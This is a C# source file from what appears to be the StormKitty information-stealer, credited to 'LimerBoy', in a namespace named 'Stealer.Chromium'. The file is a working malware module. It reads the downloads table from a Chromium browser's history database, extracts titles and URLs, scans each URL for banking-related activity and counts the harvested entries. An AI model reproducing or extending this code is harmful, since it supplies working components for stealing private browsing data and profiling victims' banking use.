/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System.Collections.Generic;

namespace Stealer.Chromium
{
    internal sealed class Downloads
    {
        /// <summary>
        /// Get Downloads from chromium based browsers
        /// </summary>
        /// <param name="sHistory"></param>
        /// <returns>List with downloads</returns>
        public static List<Site> Get(string sHistory)
        {
            try
            {
                List<Site> scDownloads = new List<Site>();

                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sHistory, "downloads");
                if (sSQLite == null)
                    return scDownloads;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    Site sSite = new Site();
                    sSite.sTitle = Crypto.GetUTF8(sSQLite.GetValue(i, 2));
                    sSite.sUrl = Crypto.GetUTF8(sSQLite.GetValue(i, 17));

                    // Analyze value
                    Banking.ScanData(sSite.sUrl);
                    Counter.Downloads++;
                    scDownloads.Add(sSite);
                }

                return scDownloads;
            }
            catch { return new List<Site>(); }
        }
    }
}
